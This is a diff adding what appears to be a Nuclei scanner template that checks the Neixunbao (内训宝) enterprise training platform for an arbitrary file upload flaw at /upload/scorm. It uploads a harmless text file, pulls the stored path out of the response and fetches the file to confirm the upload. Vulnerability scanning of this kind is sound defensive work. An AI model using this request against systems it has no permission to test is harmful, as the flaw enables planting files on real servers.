@@ -1,0 +1,48 @@
+id: neixunbao-scorm-upload
+
+info:
+  name: 内训宝企业培训平台 upload/scorm 任意文件上传漏洞
+  author: neixunbao
+  severity: high
+  tags: neixunbao
+
+http:
+  - raw:
+      - |
+        POST /upload/scorm HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Content-Type: multipart/form-data; boundary=----w80tipyzy4xm9y5cb2zk
+
+        ------w80tipyzy4xm9y5cb2zk
+        Content-Disposition: form-data; name="fileupload"; filename="testestt.txt"
+        Content-Type: application/octet-stream
+        
+        {{randstr_1}}
+        ------w80tipyzy4xm9y5cb2zk--
+
+      - |+
+        GET /upload/imgdefault/{{path}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+
+    extractors:
+      - type: regex
+        part: body
+        name: path
+        regex:
+          - 'imgdefault/([^"]*\.txt)'
+        internal: true
+        group: 1
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body_2
+        words:
+          - '{{randstr_1}}'
+    matchers-condition: and
